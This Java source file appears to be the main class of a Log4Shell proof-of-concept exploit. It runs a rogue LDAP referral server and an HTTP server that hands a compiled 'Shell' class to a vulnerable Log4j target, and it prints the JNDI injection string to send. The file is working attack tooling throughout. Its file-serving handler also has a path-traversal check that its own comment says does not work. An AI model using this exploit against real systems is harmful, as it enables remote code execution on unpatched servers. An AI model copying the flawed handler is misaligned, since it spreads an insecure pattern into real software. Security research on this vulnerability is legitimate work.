package com.zaneoblaneo.log4shellExploit;

import com.sun.net.httpserver.Headers;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import com.zaneoblaneo.ZaneUtil.console.Console;
import com.zaneoblaneo.ZaneUtil.console.LogLevel;

import java.io.*;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.Paths;

@SuppressWarnings("ConstantConditions")
public class MainClass {
	// This POC was based off of https://github.com/kozmer/log4j-shell-poc and rewritten in java.
	public static void main(String[] args) throws Exception {
		// START CONFIG
		// THERE ARE MORE CONFIGURATION SWITCHES IN Shell.java
		Console.setLogLevel(LogLevel.ALL, true);
		Console.setLogLevel(LogLevel.DEBUG, false); // comment this line to get debug output.
		final boolean hostLDAP = true;
		final boolean hostHTTP = true; // set to false if you wish to host your own external HTTP server
		final String ip = "127.0.0.1"; // IP address of the computer running the servers
		final int ldapPort = 1389; // default ldap port is 1389
		final int webPort = 9022; // the port to host the web server on.
		final String URL = "http://" + ip + ":" + ldapPort + "#/out/production/zLog4ShellExploit/com/zaneoblaneo/log4shellExploit/Shell";
		// END CONFIG
		HttpServer httpServer;
		Thread ldapServer;

		if (hostLDAP) {
			Console.logln("Send me: " + Console.ANSI_BLUE + "${jndi:ldap://" + ip + ":" + ldapPort + "/a}");
			ldapServer = new Thread(() ->
					LDAPRefServerRipped.start(URL));
			Console.logln("Starting LDAP server.");
			ldapServer.start();
			Console.logln("LDAP server thread started.");
		}

		if (hostHTTP) {
			httpServer = HttpServer.create(new InetSocketAddress(webPort), 100);
			httpServer.createContext("/", new GetHttpHandler());
			Console.logln("Starting HTTP server.");
			httpServer.start();
			Console.logln("HTTP server started.");
		}

		boolean shouldKeepRunning = true;
		while (shouldKeepRunning) {
			if (System.in.read() == '\n')
				shouldKeepRunning = false;
		}

		if (hostLDAP) {
			Console.logln("Killing the LDAP server.");
			ldapServer.interrupt();
		}
		if (hostHTTP) {
			Console.logln("Killing the HTTP server.");
			httpServer.stop(0);
		}
		System.exit(0);
	}

	@SuppressWarnings("ResultOfMethodCallIgnored")
	static class GetHttpHandler implements HttpHandler {

		@Override
		public void handle(HttpExchange exchange) throws IOException {
			Console.logln(exchange.getRemoteAddress().getAddress().getHostName() + " tried to download: " + exchange.getRequestURI().getPath());
			OutputStream os = exchange.getResponseBody();
			// Checking for directory traversal doesn't work. You shouldn't be able to access anything above the directory of zLog4ShellExploit anywho, so it's not a top priority to fix.
			if (exchange.getRequestURI().getPath().contains("/../")) {
				Console.errorln("Someone tried to get '..'");
				exchange.sendResponseHeaders(404, 5);
				os.write("Stop.".getBytes(StandardCharsets.UTF_8));
				os.flush();
				os.close();
			}
			Headers headers = exchange.getResponseHeaders();

			File file = new File(Paths.get("").toAbsolutePath() + exchange.getRequestURI().getPath());
			if (file.exists() && ! file.isDirectory()) {
				Console.debugln("Found file: " + file.getPath());
				// read the file into a buffer.
				byte[] fileBytes = new byte[(int) file.length()];
				FileInputStream fis = new FileInputStream(file);
				BufferedInputStream bis = new BufferedInputStream(fis);
				bis.read(fileBytes, 0, fileBytes.length);
				fis.close();
				bis.close();

				// just fuckin' send it.
				headers.add("Content-Type", "application/octet-stream");
				exchange.sendResponseHeaders(200, file.length());
				os.write(fileBytes, 0, fileBytes.length);
			} else {
				Console.logln(Console.ANSI_RED + "Could not find file: " + file.getPath());
				// FILE DID NOT EXIST! SO SEND A 404.
				exchange.sendResponseHeaders(404, 0);
				os.write("".getBytes());
			}
			os.flush();
			os.close();

		}
	}

}
